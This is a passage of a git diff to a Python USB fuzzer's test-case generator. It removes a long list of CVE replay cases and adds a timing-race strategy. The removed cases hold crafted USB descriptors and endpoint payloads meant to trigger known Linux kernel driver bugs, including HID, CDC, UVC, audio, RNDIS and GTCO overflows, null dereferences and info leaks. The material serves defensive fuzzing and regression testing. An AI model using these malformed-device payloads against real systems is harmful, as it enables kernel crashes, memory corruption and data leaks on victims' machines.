-            0x75, 0x08, 0x95, 0x01, 0x91, 0x02,  # 声明 1 字节输出
-            0xC0, 0xC0,
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2019-19532: HID 力反馈 OOB Write — 声明 1 输出字段但驱动期望 3",
-            device_descriptor=_desc(vid=0x0738, pid=0x1708),  # EX-LAP FF wheel
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
-                                            ep_types=[(3, 8)]),
-            hid_report_descriptor=ff_mismatch_desc,
-            ep_data_override={0x81: b'\x01\x00'},  # 只发 2 字节, 驱动期望 3
-            source_ref="drivers/hid/hid-axff.c → hid_axff_play()",
-            tags=["cve", "CVE-2019-19532", "oob_write", "force_feedback"],
-        ))
-
-        # CVE-2025-21794: ThrustMaster 栈溢出 — 3+ 个 interrupt endpoints
-        tm_cfg = bytearray()
-        cfg_total = 9 + 9 + 7 * 4  # 4 个 interrupt EP
-        tm_cfg += struct.pack('<BBHBBBBB', 9, 2, cfg_total, 1, 1, 0, 0x80, 50)
-        tm_cfg += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 4, 0xFF, 0, 0, 0)
-        for i in range(4):  # 4 个 interrupt EP (>2 触发溢出)
-            tm_cfg += struct.pack('<BBBBBBB', 7, 5, 0x80 | (i + 1), 0x03, 8, 0, 1)
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2025-21794: hid-thrustmaster 栈 OOB — 4 个 interrupt endpoints (>2 数组溢出)",
-            device_descriptor=_desc(vid=0x044F, pid=0xB68A),  # ThrustMaster VID
-            config_descriptor=bytes(tm_cfg),
-            source_ref="drivers/hid/hid-thrustmaster.c → usb_check_int_endpoints() ep_addr[2]",
-            tags=["cve", "CVE-2025-21794", "stack_oob", "thrustmaster"],
-        ))
-
-        # CVE-2025-39806: hid-multitouch slab OOB — report descriptor < 607 字节
-        short_mt_desc = bytes([
-            0x05, 0x0D, 0x09, 0x04, 0xA1, 0x01,
-            0x09, 0x22, 0xA1, 0x00,
-            0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x02, 0x81, 0x02,
-            0xC0, 0xC0,
-        ])  # ~24 bytes, 远短于 607
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2025-39806: hid-multitouch slab OOB — report descriptor 仅 24 字节 (< 607 阈值)",
-            device_descriptor=_desc(vid=0x056A, pid=0x5012),  # Wacom MT
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
-                                            ep_types=[(3, 64)]),
-            hid_report_descriptor=short_mt_desc,
-            source_ref="drivers/hid/hid-multitouch.c → mt_report_fixup() offset=607",
-            tags=["cve", "CVE-2025-39806", "slab_oob", "multitouch"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # C. CDC 子系统 CVE
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2017-16649: cdc_ether Divide-by-Zero — wMaxPacketSize=0
-        zero_mps_cfg = bytearray()
-        zero_mps_cfg += struct.pack('<BBHBBBBB', 9, 2, 25, 1, 1, 0, 0x80, 50)
-        zero_mps_cfg += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x02, 0x06, 0, 0)
-        # Bulk IN endpoint with wMaxPacketSize=0
-        zero_mps_cfg += struct.pack('<BBBBBBB', 7, 5, 0x82, 0x02, 0, 0, 0)
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16649: cdc_ether Divide-by-Zero — bulk EP wMaxPacketSize=0",
-            device_descriptor=_desc(vid=0x0B95, pid=0x7720, cls=0x02),
-            config_descriptor=bytes(zero_mps_cfg),
-            source_ref="drivers/net/usb/cdc_ether.c → usbnet_generic_cdc_bind() → dev->maxpacket",
-            tags=["cve", "CVE-2017-16649", "div_by_zero", "cdc_ether"],
-        ))
-
-        # CVE-2017-16650: qmi_wwan Divide-by-Zero — 同理但 QMI 设备
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16650: qmi_wwan Divide-by-Zero — QMI interface EP wMaxPacketSize=0",
-            device_descriptor=_desc(vid=0x1199, pid=0x68A3, cls=0xFF),  # Sierra Wireless
-            config_descriptor=bytes(zero_mps_cfg),
-            source_ref="drivers/net/usb/qmi_wwan.c → qmi_wwan_bind() → maxpacket",
-            tags=["cve", "CVE-2017-16650", "div_by_zero", "qmi_wwan"],
-        ))
-
-        # CVE-2025-21704: CDC-ACM OOB Read — 短 notification (< 8 字节)
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2025-21704: CDC-ACM notification OOB Read — 5 字节 payload (< 8 字节结构)",
-            device_descriptor=_desc(cls=0x02, sub=0x02),  # CDC-ACM
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02,
-                                            ep_types=[(3, 8)]),
-            ep_data_override={0x81: b'\xA1\x20\x00\x00\x00'},  # 5 bytes < 8
-            source_ref="drivers/usb/class/cdc-acm.c → acm_ctrl_irq() → expected_size 计算",
-            tags=["cve", "CVE-2025-21704", "oob_read", "cdc_acm"],
-        ))
-
-        # CVE-2013-1860: CDC-WDM heap overflow — interrupt-in 超过 maxcount
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2013-1860: CDC-WDM heap overflow — interrupt-in data 超过 maxcount",
-            device_descriptor=_desc(cls=0x02, sub=0x02),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02,
-                                            ep_types=[(3, 64)]),
-            ep_data_override={0x81: b'\xA1\x20\x00\x00\x00\x00\x00\x00' + b'\x41' * 512},
-            source_ref="drivers/usb/class/cdc-wdm.c → wdm_in_callback()",
-            tags=["cve", "CVE-2013-1860", "heap_overflow", "cdc_wdm"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # D. UVC 视频 CVE
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2025-40016: UVC invalid entity ID — bTerminalID=0
-        uvc_bad_entity = bytearray([
-            0x09, 0x02, 0x32, 0x00, 0x02, 0x01, 0x00, 0x80, 0xFA,
-            0x08, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00,
-            0x09, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x00,
-            # VC Header — 注意 terminal ID=0
-            0x0D, 0x24, 0x01, 0x40, 0x00, 0x30, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x01, 0x01,
-            # Input Terminal — bTerminalID=0 (CVE触发点)
-            0x11, 0x24, 0x02, 0x00,  # ← entity ID=0
-            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00,
-            # Video Streaming Interface
-            0x09, 0x04, 0x01, 0x00, 0x00, 0x0E, 0x02, 0x00, 0x00,
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2025-40016: UVC invalid entity ID — bTerminalID=0",
-            device_descriptor=_desc(cls=0x0E),
-            config_descriptor=bytes(uvc_bad_entity),
-            source_ref="drivers/media/usb/uvc/uvc_driver.c → entity registration / UVC 1.1 §3.7.2",
-            tags=["cve", "CVE-2025-40016", "uvc", "entity_id_zero"],
-        ))
-
-        # CVE-2024-53104: UVC truncated frame descriptor
-        uvc_trunc_frame = bytearray([
-            0x09, 0x02, 0x36, 0x00, 0x02, 0x01, 0x00, 0x80, 0xFA,
-            0x08, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00,
-            0x09, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x00,
-            0x0D, 0x24, 0x01, 0x40, 0x00, 0x30, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x02, 0x01,
-            0x09, 0x04, 0x01, 0x00, 0x00, 0x0E, 0x02, 0x00, 0x00,
-            # VS Header
-            0x0E, 0x24, 0x01, 0x01, 0x0F, 0x00, 0x82, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
-            # VS Format
-            0x0B, 0x24, 0x04, 0x01, 0x01, 0x59, 0x55, 0x59, 0x56, 0x00, 0x00,
-            # Truncated Frame descriptor — bLength=0x0B but should be 0x1E (30)
-            0x0B, 0x24, 0x05, 0x01, 0x80, 0x02, 0xE0, 0x01, 0x00, 0x00, 0x3C,
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2024-53104: UVC truncated frame descriptor — bLength=11 instead of 30",
-            device_descriptor=_desc(cls=0x0E),
-            config_descriptor=bytes(uvc_trunc_frame),
-            source_ref="drivers/media/usb/uvc/uvc_driver.c → uvc_parse_format()",
-            tags=["cve", "CVE-2024-53104", "uvc", "truncated", "frame_desc"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # E. USB Audio CVE
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2017-16529: snd_usb_create_streams OOB — IAD 引用越界接口
-        audio_iad_bad = bytearray([
-            0x09, 0x02, 0x20, 0x00, 0x01, 0x01, 0x00, 0x80, 0x32,
-            # IAD: bFirstInterface=0, bInterfaceCount=5 (但只有 1 个接口)
-            0x08, 0x0B, 0x00, 0x05, 0x01, 0x03, 0x00, 0x00,
-            0x09, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16529: snd_usb_create_streams OOB — IAD bInterfaceCount=5 但仅 1 接口",
-            device_descriptor=_desc(cls=0x01),  # Audio
-            config_descriptor=bytes(audio_iad_bad),
-            source_ref="sound/usb/card.c → snd_usb_create_streams() → IAD bFirstInterface+bInterfaceCount",
-            tags=["cve", "CVE-2017-16529", "audio", "oob_read", "iad"],
-        ))
-
-        # CVE-2016-2184: snd-usb-audio NULL deref — bNumEndpoints=0
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2016-2184: snd-usb-audio NULL deref — bNumEndpoints=0 (无端点)",
-            device_descriptor=_desc(vid=0x04FA, pid=0x4201, cls=0x01),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x01),
-            source_ref="sound/usb/quirks.c → create_fixed_stream_quirk() → endpoint index",
-            tags=["cve", "CVE-2016-2184", "audio", "null_deref", "zero_endpoints"],
-        ))
-
-        # CVE-2025-40275: UAC3 BADD NULL IAD — UAC3 device without IAD
-        uac3_no_iad = bytearray([
-            0x09, 0x02, 0x12, 0x00, 0x01, 0x01, 0x00, 0x80, 0x32,
-            # Audio interface with UAC3 — no IAD!
-            0x09, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x03, 0x00,  # bcdADC=0x0300 (UAC3)
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2025-40275: UAC3 BADD NULL deref — UAC3 device without IAD",
-            device_descriptor=_desc(bcd=0x0300, cls=0x01),  # USB 3.0 + Audio
-            config_descriptor=bytes(uac3_no_iad),
-            source_ref="sound/usb/mixer.c → snd_usb_mixer_controls_badd() → NULL IAD",
-            tags=["cve", "CVE-2025-40275", "audio", "uac3", "null_deref"],
-        ))
-
-        # CVE-2022-48701: snd_usb_parse_audio_interface OOB — VID 0x04FA PID 0x4201
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2022-48701: snd_usb_parse_audio_interface OOB — 0x04FA:0x4201 with < 4 interfaces",
-            device_descriptor=_desc(vid=0x04FA, pid=0x4201, cls=0x01),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x01),
-            source_ref="sound/usb/stream.c → __snd_usb_parse_audio_interface() → usb_id table index",
-            tags=["cve", "CVE-2022-48701", "audio", "oob_read", "vid_quirk"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # F. RNDIS / 网络设备 CVE
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2022-48837: RNDIS integer overflow — BufOffset=0xFFFFFFF8
-        rndis_overflow = struct.pack('<IIIIIIII',
-            0x00000005,  # RNDIS_MSG_SET
-            32,          # MsgLength
-            1,           # RequestId
-            0x00010101,  # OID
-            0xFFFFFFF8,  # BufOffset ← integer overflow trigger
-            8,           # BufLength
-            0xDEADBEEF,  # data
-            0xCAFEBABE,  # data
-        )
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2022-48837: RNDIS gadget integer overflow — BufOffset=0xFFFFFFF8 → BufOffset+8 wraps to 0",
-            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),  # RNDIS gadget VID/PID
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
-                                            ep_types=[(3, 8)]),
-            ep_data_override={0x81: rndis_overflow},
-            source_ref="drivers/usb/gadget/function/rndis.c → rndis_set_response() → BufOffset+8",
-            tags=["cve", "CVE-2022-48837", "rndis", "integer_overflow"],
-        ))
-
-        # CVE-2023-54110: rndis_host query integer overflow — DataOffset + DataLength overflow
-        rndis_query_overflow = struct.pack('<IIIIIIII',
-            0x80000004,  # RNDIS_MSG_QUERY_C (response)
-            32,          # MsgLength
-            1,           # RequestId
-            0x00010101,  # OID
-            0x80000000,  # DataOffset ← overflows with DataLength
-            0x80000000,  # DataLength ← 0x80000000 + 0x80000000 = overflow
-            0,           # Status
-            0,
-        )
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2023-54110: rndis_host query overflow — DataOffset+DataLength > 32-bit",
-            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
-                                            ep_types=[(3, 8)]),
-            ep_data_override={0x81: rndis_query_overflow},
-            source_ref="drivers/net/usb/rndis_host.c → rndis_query() → off+len overflow",
-            tags=["cve", "CVE-2023-54110", "rndis", "integer_overflow", "host_side"],
-        ))
-
-        # CVE-2022-25375: RNDIS info leak — BufOffset 越界读取内核内存
-        rndis_leak = struct.pack('<IIIIIIII',
-            0x00000005,  # RNDIS_MSG_SET
-            32,          # MsgLength
-            1,           # RequestId
-            0x00010101,  # OID
-            0x00001000,  # BufOffset ← large offset, read past buffer
-            0x100,       # BufLength
-            0x41414141, 0x42424242,
-        )
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2022-25375: RNDIS gadget info leak — BufOffset=0x1000 reads kernel memory",
-            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
-                                            ep_types=[(3, 8)]),
-            ep_data_override={0x81: rndis_leak},
-            source_ref="drivers/usb/gadget/function/rndis.c → RNDIS_MSG_SET handler",
-            tags=["cve", "CVE-2022-25375", "rndis", "info_leak"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # G. USB 串口 / 输入设备 CVE (VID/PID 特定)
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2017-16530: UAS OOB — 缺少 4 个必需端点
-        uas_missing = bytearray()
-        uas_missing += struct.pack('<BBHBBBBB', 9, 2, 16, 1, 1, 0, 0x80, 50)
-        uas_missing += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x08, 0x62, 0x00, 0x00)  # UAS class
-        uas_missing += struct.pack('<BBBBHB', 7, 5, 0x81, 0x02, 512, 0)  # bulk EP, wMaxPacketSize=512
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16530: UAS OOB Read — UAS interface 只有 1 个端点 (需要 4: cmd/status/data-in/out)",
-            device_descriptor=_desc(vid=0x152D, pid=0x0578, cls=0x08),  # JMicron UAS
-            config_descriptor=bytes(uas_missing),
-            source_ref="drivers/usb/storage/uas-detect.h → uas_find_endpoint() loop",
-            tags=["cve", "CVE-2017-16530", "uas", "oob_read", "missing_endpoints"],
-        ))
-
-        # CVE-2017-15102: legousbtower write-what-where — partial init failure
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-15102: LEGO USB Tower write-what-where — partial init failure",
-            device_descriptor=_desc(vid=0x0694, pid=0x0001),  # LEGO VID/PID
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x00),  # 无端点触发失败
-            source_ref="drivers/usb/misc/legousbtower.c → tower_probe() error path",
-            tags=["cve", "CVE-2017-15102", "write_what_where", "legousbtower"],
-        ))
-
-        # CVE-2019-13631: GTCO HID OOB write — 超大 report descriptor
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2019-13631: GTCO tablet OOB write — 超大 HID report descriptor",
-            device_descriptor=_desc(vid=0x078C, pid=0x0010),  # GTCO CalComp
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
-                                            ep_types=[(3, 64)]),
-            hid_report_descriptor=b'\x05\x0D' * 500,  # 巨型 report descriptor
-            source_ref="drivers/input/tablet/gtco.c → parse_hid_report_descriptor() debug buffer",
-            tags=["cve", "CVE-2019-13631", "gtco", "oob_write"],
-        ))
-
-        # CVE-2017-16643: GTCO OOB read — report_size/report_count 极端值
-        gtco_extreme = bytes([
-            0x05, 0x0D, 0x09, 0x02, 0xA1, 0x01,
-            0x15, 0x00, 0x27, 0xFF, 0xFF, 0x00, 0x00,  # Logical Max 0xFFFF
-            0x75, 0xFF,  # Report Size 255
-            0x96, 0xFF, 0xFF,  # Report Count 65535
-            0x81, 0x02,
-            0xC0,
-        ])
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16643: GTCO OOB read — report_size=255 × report_count=65535",
-            device_descriptor=_desc(vid=0x078C, pid=0x0010),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
-                                            ep_types=[(3, 8)]),
-            hid_report_descriptor=gtco_extreme,
-            source_ref="drivers/input/tablet/gtco.c → parse_hid_report_descriptor() global items",
-            tags=["cve", "CVE-2017-16643", "gtco", "oob_read", "extreme_values"],
-        ))
-
-        # CVE-2017-16647: ASIX net device NULL deref — 缺少 bulk endpoints
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16647: ASIX AX88179 NULL deref — 缺少 bulk-in/out endpoints",
-            device_descriptor=_desc(vid=0x0B95, pid=0x1790),  # AX88179
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0xFF),  # 无端点
-            source_ref="drivers/net/usb/asix_devices.c → ax88179_bind() → endpoint access",
-            tags=["cve", "CVE-2017-16647", "asix", "null_deref", "zero_endpoints"],
-        ))
-
-        # CVE-2017-16645: IMS PCU CDC Union OOB — bSlaveInterface0=0xFF
-        ims_bad_union = bytearray()
-        ims_bad_union += struct.pack('<BBHBBBBB', 9, 2, 27, 1, 1, 0, 0x80, 50)
-        ims_bad_union += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x02, 0x00, 0x00, 0)
-        ims_bad_union += struct.pack('<BBBBBBB', 7, 5, 0x82, 0x02, 64, 0, 0)
-        # CDC Union descriptor with invalid interface references
-        ims_bad_union += bytes([0x06, 0x24, 0x06, 0xFF, 0xFF, 0x00])  # bMaster=0xFF bSlave=0xFF
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16645: IMS PCU CDC Union OOB — bSlaveInterface0=0xFF (255)",
-            device_descriptor=_desc(vid=0x1937, pid=0x1000, cls=0x02),
-            config_descriptor=bytes(ims_bad_union),
-            source_ref="drivers/input/misc/ims-pcu.c → ims_pcu_get_cdc_union_desc() → interface index",
-            tags=["cve", "CVE-2017-16645", "ims_pcu", "cdc_union", "oob_read"],
-        ))
-
-        # CVE-2006-2935: CDROM DVD BCA integer overflow — oversized BCA length
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2006-2935: CDROM DVD BCA buffer overflow — SCSI CD-ROM with oversized BCA length",
-            device_descriptor=_desc(vid=0x058F, pid=0x6387, cls=0x08),  # Generic USB CD-ROM
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=2, if_cls=0x08,
-                                            ep_types=[(0x02, 512), (0x02, 512)]),
-            ep_data_override={0x82: b'\x00' * 4096},  # oversized bulk-in
-            source_ref="drivers/cdrom/cdrom.c → dvd_read_bca() → length field",
-            tags=["cve", "CVE-2006-2935", "cdrom", "buffer_overflow"],
-        ))
-
-        # CVE-2017-16536: cx231xx USB video NULL deref — missing endpoints
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16536: cx231xx USB video NULL deref — 缺少 video streaming endpoints",
-            device_descriptor=_desc(vid=0x1F28, pid=0x0041),  # Conexant cx231xx
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0xFF),
-            source_ref="drivers/media/usb/cx231xx/cx231xx-cards.c → cx231xx_usb_probe()",
-            tags=["cve", "CVE-2017-16536", "cx231xx", "null_deref"],
-        ))
-
-        # CVE-2019-15504: rsi_91x_usb double free
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2019-15504: RSI USB WiFi double free — bulk URB error path",
-            device_descriptor=_desc(vid=0x0483, pid=0xC016),  # RSI SDIO/WiFi
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
-                                            ep_types=[(0x02, 512)]),
-            ep_data_override={0x82: b'\xDE\xAD' * 256},  # trigger error path
-            source_ref="drivers/net/wireless/rsi/rsi_91x_usb.c → rsi_rx_urb_completion()",
-            tags=["cve", "CVE-2019-15504", "rsi", "double_free"],
-        ))
-
-        # CVE-2021-43976: mwifiex USB skb_over_panic — oversized packets
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2021-43976: mwifiex USB skb overflow — 超大 bulk-in packet (16KB+)",
-            device_descriptor=_desc(vid=0x1286, pid=0x2042),  # Marvell mwifiex
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
-                                            ep_types=[(0x02, 512)]),
-            ep_data_override={0x82: b'\x41' * 16384},  # 16KB oversized
-            source_ref="drivers/net/wireless/marvell/mwifiex/usb.c → mwifiex_usb_recv()",
-            tags=["cve", "CVE-2021-43976", "mwifiex", "skb_overflow"],
-        ))
-
-        # CVE-2017-8924: io_ti serial info leak — short bulk-in data
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-8924: Edgeport serial info leak — 短 bulk-in (3 字节)",
-            device_descriptor=_desc(vid=0x1601, pid=0x001C),  # Inside Out Edgeport
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
-                                            ep_types=[(0x02, 64)]),
-            ep_data_override={0x82: b'\x00\x00\x01'},  # 3 bytes, uninitialized read
-            source_ref="drivers/usb/serial/io_ti.c → edge_bulk_in_callback()",
-            tags=["cve", "CVE-2017-8924", "edgeport", "info_leak"],
-        ))
-
-        # CVE-2017-16528: ALSA seq_device UAF — USB-MIDI rapid disconnect
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16528: USB-MIDI UAF — class=0x01 sub=0x03 (MIDI streaming)",
-            device_descriptor=_desc(cls=0x01, sub=0x03),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x01,
-                                            ep_types=[(0x02, 64)]),
-            source_ref="sound/core/seq_device.c → snd_rawmidi_dev_seq_free()",
-            tags=["cve", "CVE-2017-16528", "usb_midi", "uaf"],
-        ))
+        # 8d: 枚举全程延迟响应 → 超时竞争
+        for delay in [500, 2000, 5000]:
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略8-断连竞争] 枚举全程延迟 {delay}ms — "
+                f"hub event handler 超时 + 并发操作 → 竞争条件",
+                delay_response_ms=delay,
+                source_ref="drivers/usb/core/hub.c → hub_event() "
+                           "— HUB_DEBOUNCE_TIMEOUT 和枚举状态机竞争",
+                tags=["cve_strategy", "race_disconnect", "timing", f"delay_{delay}"],
+            ))
 
         return cases[:max_cases]
+
 
     # ═══════════════════════════════════════════════════════════════════════
     # 全量生成
@@ -2425,10 +2338,10 @@ class StrategyGenerator:
             FuzzPhase.UVC_DEEP:       self.gen_uvc_deep_cases,
             FuzzPhase.AUDIO_DEEP:     self.gen_audio_deep_cases,
             FuzzPhase.RNDIS_DEEP:     self.gen_rndis_deep_cases,
-            FuzzPhase.CVE_REPLAY:     self.gen_cve_replay_cases,
+            FuzzPhase.CVE_REPLAY:     self.gen_cve_strategy_cases,
         }
         result = {}
         for phase, gen in generators.items():
-            cap = 60 if phase == FuzzPhase.CVE_REPLAY else max_per_phase
+            cap = 100 if phase == FuzzPhase.CVE_REPLAY else max_per_phase
             result[phase] = gen(max_cases=cap)
         return result
